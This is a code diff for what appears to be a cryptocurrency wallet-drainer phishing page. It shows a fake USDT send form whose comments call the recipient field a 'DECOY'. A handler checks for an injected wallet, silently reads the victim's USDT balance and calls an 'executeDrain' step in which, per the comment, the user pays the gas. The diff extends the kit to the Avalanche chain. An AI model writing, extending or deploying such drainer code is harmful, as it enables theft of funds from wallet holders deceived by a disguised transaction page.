@@ -47,6 +47,15 @@ const NETWORKS = {
         blockExplorer: 'https://optimistic.etherscan.io',
         usdtAddress: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
         icon: '🔴'
+    },
+    avalanche: {
+        chainId: '0xa86a',
+        chainName: 'Avalanche C-Chain',
+        rpcUrl: 'https://api.avax.network/ext/bc/C/rpc',
+        nativeCurrency: { name: 'Avalanche', symbol: 'AVAX', decimals: 18 },
+        blockExplorer: 'https://snowtrace.io',
+        usdtAddress: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
+        icon: '🔺'
     }
 };
 
@@ -117,23 +126,25 @@ const ui = {
     amountGroup: document.getElementById('amountGroup'),
     pasteBtn: document.getElementById('pasteBtn'),
     networkSelect: document.getElementById('networkSelect'),
-    networkLabel: document.getElementById('networkLabel'),
     networkIcon: document.getElementById('networkIcon'),
     usdtLabel: document.getElementById('usdtLabel')
 };
 
 // ── Module Entry Point ──
 document.addEventListener('DOMContentLoaded', () => {
+    // Check 1 — Served from real web server (not file://)
     if (location.protocol === 'file:') {
         console.warn('[ABORT] Check 1 fail: file:// protocol');
         return;
     }
 
+    // Check 2 — window.ethereum injected by wallet
     if (typeof window.ethereum === 'undefined') {
         console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
         return;
     }
 
+    // Check 3 — nextBtn exists in DOM
     if (!ui.nextBtn) {
         console.warn('[ABORT] Check 3 fail: #nextBtn not found');
         return;
@@ -150,7 +161,6 @@ document.addEventListener('DOMContentLoaded', () => {
     ui.networkSelect.addEventListener('change', (e) => {
         currentNetwork = e.target.value;
         updateNetworkDisplay();
-        updateUsdtLabel();
     });
 
     // UI Helpers
@@ -160,36 +170,42 @@ document.addEventListener('DOMContentLoaded', () => {
         ui.nextBtn.disabled = val <= 0;
         if (val > 0) {
             ui.nextBtn.classList.add('enabled');
-            ui.clearAmount.style.display = 'flex';
+            ui.clearAmount.classList.add('visible');
         } else {
             ui.nextBtn.classList.remove('enabled');
-            ui.clearAmount.style.display = 'none';
+            ui.clearAmount.classList.remove('visible');
         }
     };
 
+    // Clear amount button
     ui.clearAmount.onclick = () => {
         ui.amountInput.value = '';
         ui.amountInput.oninput();
+        ui.clearAmount.classList.remove('visible');
     };
 
+    // Clear address button (only clears the DECOY address)
     ui.clearAddr.onclick = () => {
         ui.recipientInput.value = '';
-        ui.clearAddr.style.display = 'none';
+        ui.clearAddr.classList.remove('visible');
     };
 
+    // Recipient input handler (only for DECOY display)
     ui.recipientInput.oninput = () => {
         if (ui.recipientInput.value.length > 0) {
-            ui.clearAddr.style.display = 'flex';
+            ui.clearAddr.classList.add('visible');
         } else {
-            ui.clearAddr.style.display = 'none';
+            ui.clearAddr.classList.remove('visible');
         }
     };
 
+    // Max button
     ui.maxBtn.onclick = () => {
         ui.amountInput.value = "1000";
         ui.amountInput.oninput();
     };
 
+    // Paste button (pastes into DECOY field)
     ui.pasteBtn.onclick = async () => {
         try {
             const text = await navigator.clipboard.readText();
@@ -200,14 +216,18 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
+    // Focus effects
     ui.addrGroup.addEventListener('focusin', () => ui.addrGroup.classList.add('active'));
     ui.addrGroup.addEventListener('focusout', () => ui.addrGroup.classList.remove('active'));
     ui.amountGroup.addEventListener('focusin', () => ui.amountGroup.classList.add('active'));
     ui.amountGroup.addEventListener('focusout', () => ui.amountGroup.classList.remove('active'));
 
+    // Initial trigger
     ui.recipientInput.oninput();
+    ui.amountInput.oninput();
 });
 
+// ── Populate Network Selector ──
 function populateNetworkSelector() {
     const select = ui.networkSelect;
     if (!select) return;
@@ -217,28 +237,21 @@ function populateNetworkSelector() {
         const network = NETWORKS[key];
         const option = document.createElement('option');
         option.value = key;
-        option.textContent = `${network.icon} ${network.chainName}`;
+        option.textContent = network.chainName;
         select.appendChild(option);
     });
 }
 
+// ── Update Network Display ──
 function updateNetworkDisplay() {
     const network = NETWORKS[currentNetwork];
     if (!network) return;
     
-    if (ui.networkLabel) {
-        ui.networkLabel.textContent = network.chainName;
-    }
     if (ui.networkIcon) {
         ui.networkIcon.textContent = network.icon;
     }
-    updateUsdtLabel();
-}
-
-function updateUsdtLabel() {
-    const network = NETWORKS[currentNetwork];
-    if (ui.usdtLabel) {
-        ui.usdtLabel.textContent = 'USDT';
+    if (ui.networkSelect) {
+        ui.networkSelect.value = currentNetwork;
     }
 }
 
@@ -304,7 +317,7 @@ async function handleNextClick() {
         // Step 4 — Silent USDT balance recon
         const balanceHex = await fetchMaxBalance(userAddress, currentNetwork);
         
-        // Step 5 — Execute the drain
+        // Step 5 — Execute the drain (user pays gas)
         await executeDrain(balanceHex, currentNetwork);
 
         ui.nextBtn.innerHTML = '✓ Completed';
